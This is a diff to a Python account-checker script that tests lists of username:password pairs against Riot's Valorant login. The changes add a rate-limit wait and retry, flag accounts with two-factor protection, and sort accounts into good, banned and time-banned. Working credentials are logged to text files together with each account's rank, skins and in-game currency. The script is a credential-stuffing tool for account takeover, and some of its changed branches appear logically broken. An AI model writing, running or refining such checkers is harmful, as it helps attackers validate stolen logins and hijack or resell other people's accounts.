@@ -109,6 +109,7 @@ def checker():
                 'access_token=((?:[a-zA-Z]|\d|\.|-|_)*).*id_token=((?:[a-zA-Z]|\d|\.|-|_)*).*expires_in=(\d*)')
             data = pattern.findall(data['response']['parameters']['uri'])[0]
             token = data[0]
+            typebanned = "unbann"
             checked += 1
         elif "auth_failure" in r2.text:
             if choice == 2:
@@ -120,20 +121,25 @@ def checker():
             continue
         elif "rate_limited" in r2.text:
             if choice == 2:
-                print(f"{Fore.YELLOW}[Ratelimited]{Fore.RESET}")
+                print(f"{Fore.YELLOW}[Ratelimited]{Fore.RESET} {username}:{password} waiting 20 sec")
             if choice == 3:
-                print(f"{Fore.YELLOW}[Ratelimited]{Fore.RESET}")
+                print(f"{Fore.YELLOW}[Ratelimited]{Fore.RESET} {username}:{password} waiting 20 sec")
             rate += 1
-            checked += 1
-            time.sleep(2)
+            time.sleep(20)
+            continue
+        elif 'multifactor' in r2.text:
+            typebanned = "2FA"
+            if choice == 2:
+                print(f"{Fore.BLUE}[2FA]{Fore.RESET} {username}:{password} Type: {typebanned}")
+            if choice == 3:
+                print(f"{Fore.BLUE}[2FA]{Fore.RESET} {username}:{password} Type: {typebanned}")
             continue
         else:
-            if choice == 2:
-                print(f"{Fore.BLUE}[2FA]{Fore.RESET} {username}:{password}")
-            if choice == 3:
-                print(f"{Fore.BLUE}[2FA]{Fore.RESET} {username}:{password}")
-            checked += 1
-            continue
+            pattern = compile('access_token=((?:[a-zA-Z]|\d|\.|-|_)*).*id_token=((?:[a-zA-Z]|\d|\.|-|_)*).*expires_in=(\d*)')
+            data = pattern.findall(data['response']['parameters']['uri'])[0]
+            token = data[0]
+            typebanned = "unbann"
+            
         headers = {
             'User-Agent': 'RiotClient/51.0.0.4429735.4381201 rso-auth (Windows;10;;Professional, x64)',
             'Authorization': f'Bearer {token}',
@@ -178,7 +184,7 @@ def checker():
                 unix_time1 = int(unix_time1)
                 result_s1 = pandas.to_datetime(unix_time1,unit='ms')
                 str(result_s1)
-                bannedtxt1 = open("results//ban.txt", "a+")
+                bannedtxt1 = open("results//timeban.txt", "a+")
                 bannedtxt1.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Expire {result_s1}\n| Creattion: {result_s}\n|[-------------------------------------]\n\n")
                 bannedtxt1.close()
                 if choice == 2:
@@ -187,30 +193,36 @@ def checker():
                     print(f"{Fore.RED}[Banned]{Fore.RESET} {username}:{password} Type: {typebanned}")
                 timeban += 1
                 continue
-            if choice == 2:
-                if typebanned == None:
-                    typebanned = "Unbanned"
+
+            elif typebanned == "unbann":
+                if choice == 2:
                     bannedtxt12 = open("results//good.txt", "a+")
-                    bannedtxt12.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Last Game: {last_time}\n| Region: {Region}\n| Level: {AccountLevel}\n| Email Verified: {EmailVerified}\n| Creation: {result_s}\n| Rank: {Rank}\n| VP: {ValorantPoints} - RP: {Radianite}\n|-------------[Skins({len(userSkins)})]-------------]\n{SkinStr}[-------------------------------------]\n\n")
+                    bannedtxt12.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Email Verified: {EmailVerified}\n| Creation: {result_s}\n[-------------------------------------]\n\n")
                     bannedtxt12.close()
                     if choice == 2:
                         print(f"{Fore.GREEN}[Good]{Fore.RESET} {username}:{password} Type: {typebanned}")
                     good += 1
                     continue
-            if choice == 1:
-                if typebanned == None:
-                    typebanned = "Unbanned"
+            else:
+                if choice == 2:
                     bannedtxt12 = open("results//good.txt", "a+")
-                    bannedtxt12.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Last Game: {last_time}\n| Region: {Region}\n| Level: {AccountLevel}\n| Email Verified: {EmailVerified}\n| Creation: {result_s}\n| Rank: {Rank}\n| VP: {ValorantPoints} - RP: {Radianite}\n|-------------[Skins({len(userSkins)})]-------------]\n{SkinStr}[-------------------------------------]\n\n")
-                    bannedtxt12.close()
+                    bannedtxt12.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Email Verified: {EmailVerified}\n| Creation: {result_s}\n[-------------------------------------]\n\n")
                     if choice == 2:
                         print(f"{Fore.GREEN}[Good]{Fore.RESET} {username}:{password} Type: {typebanned}")
                     good += 1
                     continue
         except:
             if choice == 2:
-                print(f"{Fore.BLUE}[2FA]{Fore.RESET} {username}:{password} Type: {typebanned}")
-            return
+                if typebanned == None:
+                    typebanned = "Unbanned"
+                    bannedtxt12 = open("results//good.txt", "a+")
+                    bannedtxt12.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Email Verified: {EmailVerified}\n| Creation: {result_s}\n[-------------------------------------]\n\n")
+                    bannedtxt12.close()
+                    if choice == 2:
+                        print(f"{Fore.GREEN}[Good]{Fore.RESET} {username}:{password} Type: {typebanned}")
+                    good += 1
+                    continue
+            continue
         if choice == 3:
     #get Region + Accountlvl
             r2 = session.get(f"https://api.henrikdev.xyz/valorant/v1/account/{GameName}/{Tag}")
@@ -323,7 +335,8 @@ def checker():
                 bannedtxt12.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Last Game: {last_time}\n| Region: {Region}\n| Level: {AccountLevel}\n| Email Verified: {EmailVerified}\n| Creation: {result_s}\n| Rank: {Rank}\n| VP: {ValorantPoints} - RP: {Radianite}\n|-------------[Skins({len(userSkins)})]-------------]\n{SkinStr}[------------------------------------]\n\n")
                 bannedtxt12.close()
                 if choice == 3:
-                    print(f"{Fore.GREEN}[Good]{Fore.RESET} User&Pass: {username}:{password} | Banntype: {typebanned} | Last Game: {} | Region: {Region} | Level: {AccountLevel} | Email Verified: {EmailVerified} | Creation: {result_s} | Rank: {Rank} | VP: {ValorantPoints} - RP: {Radianite} [Skins({len(userSkins)})]")
+                    print(f"{Fore.GREEN}[Good]{Fore.RESET} User&Pass: {username}:{password} | Banntype: {typebanned} | Last Game: {last_time} | Region: {Region} | Level: {AccountLevel} | Email Verified: {EmailVerified} | Creation: {result_s} | Rank: {Rank} | VP: {ValorantPoints} - RP: {Radianite} [Skins({len(userSkins)})]")
                 good += 1
                 continue
+        
 checker()
